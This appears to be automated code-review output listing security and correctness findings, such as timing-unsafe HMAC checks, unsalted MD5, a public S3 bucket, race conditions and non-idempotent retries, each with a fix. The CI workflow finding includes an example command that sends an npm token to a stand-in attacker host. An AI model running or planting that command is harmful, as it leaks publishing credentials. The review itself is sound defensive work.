findings.body: A function named `verify_endpoint` that returns a status code reads as "tell me whether this target is reachable". But `requests.get` raises `ConnectionError`, `Timeout`, `MissingSchema` or `InvalidURL` for exactly the failure modes verification is meant to detect, so the common negative case propagates an exception rather than returning a value. Every caller must wrap the call in `try/except requests.RequestException` to get a usable answer. Either catch `requests.RequestException` here and return `None`/`0`, or document that the function raises so callers handle it deliberately.

findings.title: Public function verify_endpoint lacks documentation of contract
findings.body: The function `verify_endpoint` is a new public function (defined at module level with no leading underscore) that takes a URL parameter and returns an HTTP status code. A caller cannot determine from the name and signature alone whether this function: (a) validates that the URL is safe to fetch, (b) what schemes are allowed, (c) whether timeouts or network errors are expected to raise or return a sentinel, (d) whether the caller is responsible for allowlisting the URL first. Given that the sibling function `send_webhook` enforces an allowlist check, callers of `verify_endpoint` may reasonably assume it does too — but the code shows it does not. This is a contract violation waiting to happen.

findings.title: Invoices bucket disables all public access blocks (copy-paste from assets)
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets all four guards to `false`, which is the configuration deliberately chosen for the public `assets` bucket directly above it. Applied to `acme-customer-invoices`, this permits any public ACL or bucket policy to be attached and stops AWS from ignoring/restricting existing public grants — customer invoice objects can be exposed publicly by a single later ACL or policy change, with no account-level backstop.

Unless public serving of invoices is intended, set all four to `true` (the AWS default for new buckets is to block). If this block is only present to mirror the assets resource, the safest fix is:

```
resource "aws_s3_bucket_public_access_block" "invoices" {
  bucket                  = aws_s3_bucket.invoices.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

findings.title: Undocumented public access on invoices bucket

findings.title: Webhook HMAC compared with == instead of compare_digest
findings.body:
`verify_acmepay` computes the expected HMAC and then compares it to the caller-supplied `header` with `==`. Python's string `==` short-circuits on the first differing byte, so comparison time leaks how many leading hex characters of the expected digest the attacker guessed correctly. An attacker who can submit many webhook deliveries for a chosen body can recover the valid signature byte-by-byte and forge webhook events without knowing `secret`.

Fix: use the same primitive as the function directly above it — `return hmac.compare_digest(expected, header)`. Note `compare_digest` requires ASCII-only str operands, which holds for a hexdigest but not necessarily for an attacker-supplied header, so coerce/validate `header` (e.g. reject non-hex or encode both sides to bytes) before comparing.

_Also raised by the correctness agent:_ verify_acmepay compares HMAC with == instead of compare_digest

findings.title: Exception message and stack trace returned to the client
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` body; it now serialises `str(exc)` plus `traceback.format_exc()` into the HTTP 500 response. Stack traces disclose absolute file paths, module and function names, library versions, and often fragments of the offending data — for example a DB driver error can echo the failing SQL, and a connection failure can echo the host/user portion of a DSN. Any unauthenticated caller who can trigger an unhandled exception gets a free map of the internals, which materially eases further attacks.

Keep the opaque body for the client and keep the detail server-side: `log.exception("request failed")` on line 8 already captures the traceback. If callers need to correlate, return a generated error/correlation id and log it alongside the exception, or gate the verbose body behind an explicit non-production debug flag rather than making it the default.

_Also raised by the correctness agent:_ traceback.format_exc() is unrelated to the `exc` argument

A test asserting the response body does NOT contain the exception message/traceback (or asserts the exact expected safe shape) would catch this class of regression.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a stored password value with a single unsalted MD5 pass. MD5 is a fast, collision-broken hash: a commodity GPU evaluates billions of candidates per second, so any digest produced here is recoverable for all but very high-entropy inputs, and identical passwords produce identical digests across users (no per-user salt), enabling rainbow-table and cross-account correlation attacks. The same file already demonstrates the correct primitive on line 7 \u2014 `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())` \u2014 so the fix is to make the reset path call `hash_password` (or bcrypt directly) rather than introducing a second, weaker scheme. If any already-stored MD5 digests exist, they should be treated as compromised and rehashed on next login.

If this value is instead meant to be a short-lived reset *token* rather than a stored password, it should be generated with `secrets.token_urlsafe` and compared with `hmac.compare_digest`, not derived from user input via MD5.

findings.title: Reset hash format is incompatible with bcrypt verification
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`, 60 chars) that callers presumably verify with `bcrypt.checkpw`. `hash_reset_password` returns a 32-char MD5 hex digest. If a password reset writes this value into the same stored-password field, the subsequent login check will fail for every reset user \u2014 `bcrypt.checkpw` raises `ValueError: invalid salt` on a non-bcrypt hash rather than returning False, so this surfaces as a 500 rather than a failed login. Either produce the same bcrypt format here (just call `hash_password`), or make the distinct storage location and distinct verification path explicit; a separate, weaker digest for the same column is a silent format break. (The choice of unsalted MD5 for any password-derived secret is separately unsuitable.)

Since this function handles password reset hashing, a behavior change here would go undetected.

findings.title: pull_request_target executes fork-controlled code with repo secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to `secrets.*` and receives a write-scoped `GITHUB_TOKEN`, and it runs without approval for first-time contributors. Line 12 then deliberately checks out `github.event.pull_request.head.sha` — the attacker's commit — and line 13 executes `./scripts/measure.sh` from that checkout, with `NPM_TOKEN` injected on line 15.

Entry point: the head commit of any pull request opened from a fork. Anyone can open one. Sink: `run: ./scripts/measure.sh`, where the script body (and anything it sources: package.json scripts, lockfile install hooks, Makefiles) is entirely attacker-supplied. A PR that replaces `scripts/measure.sh` with `curl -d @- attacker.tld <<< "$NPM_TOKEN"` publishes the npm publish token. Separately, `actions/checkout` persists credentials in `.git/config` by default, so the privileged `GITHUB_TOKEN` is also readable by that script and can be used to push to the base repository.

Fixes, in order of preference:
- Revert line 4 to `pull_request`. A size check does not need repository secrets; if `NPM_TOKEN` is only needed for an authenticated registry read, move that work to a job that does not check out fork code.
- If a privileged context is genuinely required, split it: a `pull_request` job produces an artifact, and a separate `workflow_run` job consumes it without ever executing fork code.
- If neither is possible, do not check out the fork ref in the privileged job at all, or at minimum never run fork-authored scripts and drop the secret from the step env.

_Also raised by the correctness agent:_ pull_request_target runs fork-controlled code with NPM_TOKEN

findings.title: json.dumps raises TypeError for contexts the old key accepted

findings.title: Test only checks shell=False kwarg, not the argv list itself

The whole point of this fix is that the command is built as a list of discrete argv elements (['tar','-czf', f'/exports/{name}.tar.gz', '--', directory]) rather than one interpolated shell string. test_runs_without_a_shell only asserts spy.last_call.kwargs['shell'] is False; it never inspects spy.last_call.args (or equivalent) to confirm the command is actually a list with `directory` as a separate element. A regression that keeps shell=False but reverts to passing a single formatted string (e.g. subprocess.run([f'tar -czf ... {directory}'], shell=False)) — which reintroduces the injection surface this PR is fixing conceptually if anything downstream ever shells out to that string — would still pass this test. findings.title: Date comparison against wall clock fails across a UTC midnight boundary
findings.body:
`issue_token()` captures `issued_at` at one instant, and line 11 re-reads the clock with `datetime.now(timezone.utc)`. If the test runs just before 00:00 UTC and the second read lands after it, the two `.date()` values differ and the assertion fails through no fault of the code under test. The existing test above it (lines 4-6) avoids this by pinning both the issue time and `now` to fixed values.

Note that line 12 has the same latent problem — it relies on `is_expired`'s implicit default clock, so the pass/fail result depends on how long the preceding lines took.

findings.title: Blocking requests.get inside async handler stalls the event loop
findings.body:
`fetch_plan_limits` is `async` but never awaits anything: `requests.get(...)` is a synchronous, blocking socket call. Awaiting this coroutine from an async request handler pins the event loop thread for the full duration of the billing call — up to the 5s timeout, and longer if DNS/connect stalls — so every other in-flight request on that worker stalls too. The `async` keyword also misleads callers into thinking this yields control.

Fix by using the httpx async client the module already imports, mirroring `fetch_plan` on lines 5-7:

```python
async def fetch_plan_limits(client: httpx.AsyncClient, tenant_id):
    response = await client.get(f"https://billing.internal/limits/{tenant_id}", timeout=5)
    return response.json()
```

If the synchronous library must stay, offload it with `anyio.to_thread.run_sync` / `loop.run_in_executor` rather than calling it inline. Dropping the new `requests` import (line 2) then keeps the module on a single HTTP stack.

There is no test in this diff. Even if one were added, a typical unit test that mocks requests.get and asserts on the returned JSON would pass regardless of whether the call blocks the event loop — it wouldn't catch the concurrency defect. A meaningful test would need to run this alongside other coroutines and verify they aren't blocked, or use an async HTTP client instead.

Note the pre-existing `fetch_plan` on line 6 has the same shape, so a shared validation helper is probably the right fix.

findings.title: try_consume reads and writes _counters without _lock across an await
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, checks the limit on line 16, then awaits on line 18 before writing `_counters[tenant] = current + cost` on line 19 \u2014 all outside `_lock`. Two consequences, both reachable with ordinary concurrent traffic:

1. **Limit overrun.** The `await` on line 18 is an explicit yield point, so any number of coroutines can pass the `current + cost > LIMIT` check with the same stale `current` before any of them writes. N concurrent callers can each be told `True` and the counter ends up far above `LIMIT`.
2. **Lost updates.** Line 19 writes an absolute value computed from a stale read rather than incrementing. Any `consume()` call that completes in the interim \u2014 even though it correctly holds `_lock` \u2014 is silently clobbered, so `_lock` no longer protects `_counters` at all.

Fix by doing the whole read-check-write under the lock, and by incrementing rather than assigning a value derived from a pre-await snapshot:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

If the awaited work on line 18 is a placeholder for real I/O, it must be moved outside the critical section (and the counter reserved before it, refunded on failure), not left straddling the check.

findings.title: Rate limit bypassable: check-then-act on _counters without _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` (line 15), decides against `LIMIT` (line 16), then yields to the event loop (`await asyncio.sleep(0)`, line 18) before writing back on line 19 — all outside `_lock`, which the sibling `consume` does hold. Any number of coroutines for the same tenant can interleave at the await, each having read the same `current`, each returning `True`, and each writing `current + cost` — an absolute assignment, not an increment, so the earlier writes are discarded entirely. The effective ceiling for a burst of N concurrent requests is `current + cost` rather than `current + N*cost`, i.e. the limit does not bind under exactly the concurrency it exists to control. A client that fires requests in parallel instead of serially gets unmetered capacity, and because the write clobbers rather than accumulates, the counter also drifts below the true consumption permanently, weakening the limit for all later calls.

Fix by doing the read, the check and the write inside `async with _lock:` with no await in between (or reuse `consume`'s locked increment and roll back on overflow).

I cannot see the caller in this diff or in retrieved context, so I cannot name the HTTP/RPC entry point that feeds `tenant`/`cost`; the severity assumes this is reachable per external request, as the name and the existence of `LIMIT` suggest.

There is no test file in this diff exercising concurrent calls to try_consume, so a bug that lets concurrent tenants exceed LIMIT (or corrupts the counter) would not be caught. At minimum, a test asserting that concurrent try_consume calls for the same tenant never allow the sum to exceed LIMIT is needed to catch this class of defect.

findings.title: Mutable default argument accumulates state across calls
findings.body:
`attempted=[]` is evaluated once at function definition, so all callers that omit the argument share a single list object. Line 10 appends to that shared list and line 11 returns it, so the second call returns the first call's failures plus its own, growing without bound for the process lifetime. Callers treating the return value as "recipients that failed in this call" will get wrong results, and any caller that mutates the returned list corrupts the default for everyone else.

Use the same pattern already applied two lines above for `extra_headers`:

```python
def send_with_retries(recipients, attempted=None):
    attempted = list(attempted) if attempted else []
```

(or `attempted = [] if attempted is None else attempted` if the caller is meant to see its own list mutated).

findings.title: compute_rounding flips >= to >, dropping the exact half-cent case
findings.body: The rounding predicate changed from `line.remainder_cents >= 0.5` to `line.remainder_cents > 0.5`. For a remainder of exactly 0.5 — the single most common remainder in cent-level money arithmetic, produced by any even split of an odd number of cents — the function now returns 0 where it previously returned 1. This is round-half-down instead of round-half-up, and it will produce off-by-one-cent discrepancies on invoices and reconciliations. If the change was intentional, it does not belong in a rename commit and needs a test pinning the 0.5 boundary; otherwise restore `>=`.

No test file is included in this diff, so nothing would catch this regression if it is unintended. Since this is billing/rounding logic, an incorrect result here has real financial impact.

findings.title: Off-by-one in page_of_sorted drops the last record of every page
findings.body: `ordered[start : start + PAGE_SIZE - 1]` uses an exclusive upper bound, so it yields only `PAGE_SIZE - 1` items. Because the next page starts at `(page + 1) * PAGE_SIZE`, the element at index `start + PAGE_SIZE - 1` is never returned by any page — one record is silently lost per page boundary, which for an export endpoint means incomplete exports rather than a visible error. Change the slice to `ordered[start : start + PAGE_SIZE]`, matching `page_of` on line 6, and add a test asserting that concatenating consecutive pages reproduces the full sorted list.

No test file is included in this diff, so this defect would not be caught by any existing or new test. A test asserting that a page of a known record set returns exactly PAGE_SIZE records (or the correct remainder on the last page) would catch this immediately.

findings.title: File handle leaks when header validation fails
findings.body:
`fh = open(path)` is only closed on line 16, which is reached solely on the success path. When `header != expected_header` the function returns at line 14 with the handle still open, and any exception from `next(reader)` or `list(reader)` (decode errors, `csv.Error`, I/O errors) escapes the same way. Under repeated calls with mismatched headers this exhausts file descriptors and, on CPython, defers release to GC (on PyPy, indefinitely).

Use the same `with open(path) as fh:` form already used by `read_rows` on line 5, and return from inside the block.

findings.title: Retry wraps non-idempotent charge() with no idempotency key
findings.body:
`charge()` is documented in `billing/gateway.py` as "NOT idempotent: each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any transient failure that occurs *after* the gateway has accepted the POST \u2014 a read timeout, a dropped connection, a 5xx returned by a proxy downstream of charge creation \u2014 causes the decorator to re-POST, creating a second (and possibly third) real charge against the customer's card. The retry cannot distinguish "request never arrived" from "response never came back".

The gateway already provides the fix: it supports an `Idempotency-Key` header. Generate a key once in `charge_card` (outside the retried call, so all attempts share it) and pass it through to `charge()`, extending `charge()`'s signature if needed. Absent that, the retry decorator should be removed from this function \u2014 `fetch_charge` on line 6 is the correct use of it, since `get_charge` is documented safe to repeat.

_Also raised by the security agent:_ Retry on non-idempotent charge allows duplicate charges under induced failures

findings.title: Retry decorator on non-idempotent operation without documented safeguard
findings.body:
The new `charge_card` function applies `@retry(attempts=3)` to `charge()`, which is explicitly documented as "NOT idempotent: each call creates a new charge." The docstring of `charge` states that retries are safe only when an Idempotency-Key header is passed. However, `charge_card` provides no way for callers to pass this header, and the function itself has no docstring explaining this critical limitation or that it may create duplicate charges on retry.

Add a docstring to `charge_card` that explicitly documents the retry behaviour and warns of the risk, or refactor to accept and pass through an idempotency key.

There is no test in this diff verifying retry/failure behavior for charge_card, so a change that causes a transient failure to trigger multiple real charges would not be caught by any existing test — the only test-like coverage visible in the repo is for the read-only fetch_charge path.

findings.title: Naive datetime subtracted from aware expires_at raises TypeError
findings.body:
`datetime.now()` returns a naive datetime, but `Invite.expires_at` is documented as always timezone-aware UTC. Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails for every invite, not just an edge case. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does. (`timezone` is already imported in this module.)

This comparison will fail at runtime with `TypeError: can't subtract offset-naive and offset-aware datetimes`. findings.title: Default retry count change breaks documented caller assumption
findings.body: The fetch() function's default retry count has been reduced from 5 to 1. However, sync/nightly.py contains documentation explicitly stating it relies on fetch()'s default retry count to survive a known flaky API that returns 503 errors roughly one-third of the time. This default of 1 retry is insufficient for that use case, and callers acting on the old documentation will now fail. Either restore the default, or update the caller to explicitly pass retries=5.

findings.title: Lowered retries default regresses INC-4471 fix in sync_partner_catalogue
findings.body:
`fetch()`'s `retries` default drops from 5 to 1. `sync/nightly.py:sync_partner_catalogue()` calls `fetch(url)` with no `retries` argument and its docstring states explicitly that it relies on the default retry count to get through a partner API that returns 503 roughly one call in three, and that this was the fix for INC-4471.

With a ~1/3 per-call failure rate, 5 attempts leaves roughly a 1-in-240 chance of failing outright; 1 retry (2 attempts) leaves roughly 1-in-9 — a nightly job that now fails regularly, reopening the incident.

Either keep the default at 5, or make the dependency explicit at the call site by passing `retries=5` in `sync_partner_catalogue()` as part of this change (and update its docstring so the next person doesn't re-derive the same trap). Also worth auditing any other no-`retries` callers not shown here.

This diff changes that default from 5 to 1 with no test exercising sync_partner_catalogue or fetch()'s default argument. If this change is wrong, nothing in the repo would fail — there is no test asserting fetch's default retries or that sync_partner_catalogue retries enough to survive intermittent 503s.

findings.title: Duplicate index: same columns/order as invoices_tenant_created_idx (0007)
findings.body:
Migration 0007 already created `invoices_tenant_created_idx ON invoices (tenant_id, created_at DESC)`. This statement creates a byte-for-byte equivalent index under the name `invoices_tenant_created_idx2`. Because the name differs, Postgres will not reject it, so the duplication is silent: the table permanently carries two identical B-trees, doubling the write/VACUUM cost and disk footprint for `invoices` with zero planner benefit (the planner will simply pick one). Additionally, a plain `CREATE INDEX` takes a lock that blocks writes to `invoices` for the duration of the build, so this migration buys downtime for an index that already exists.

Recommended: drop this statement. If the intent was to change something about the existing index (fillfactor, included columns, partial predicate), state that explicitly and replace the old index rather than adding a second one.

findings.title: Eviction clears the entry just written, discarding the refresh
findings.body: `_CACHE[tenant_id] = tenant` is immediately followed by a size check that calls `_CACHE.clear()`. Once the cache reaches 1001 entries, every call to `get_tenant_fresh` writes the fresh value and then wipes it along with everything else, so a following `get_tenant(tenant_id)` returns `None` even though the tenant was just fetched and cached. The refresh only sticks while the cache is under the threshold, which makes the behaviour size-dependent and hard to reproduce. Evict selectively (e.g. drop the oldest entry, or clear before inserting) so the value just fetched survives.

findings.title: get_tenant_fresh has no test coverage for its side effects or eviction logic
findings.body: get_tenant_fresh fetches fresh data, writes it into _CACHE, and clears the entire cache once it exceeds 1000 entries. None of this is exercised by any test in the diff. A regression — e.g. the cache never being updated, the threshold being off, or clear() firing on every call — would not be caught by anything currently in the repo. At minimum, a test verifying (1) the cache is updated with the fetched value and (2) the eviction only triggers at the size boundary would catch real bugs here.

findings.title: get_* name misleads: function mutates cache state
findings.body: The function `get_tenant_fresh` uses the `get_*` naming convention, which signals a read-only lookup operation to callers. However, the implementation mutates shared state: it writes to `_CACHE` (line 10) and conditionally clears it (line 12). A caller expecting a pure read operation will be surprised by side effects. Consider renaming to `fetch_tenant_fresh` or `refresh_tenant` to clarify that this function modifies cache state, not merely retrieves from it.
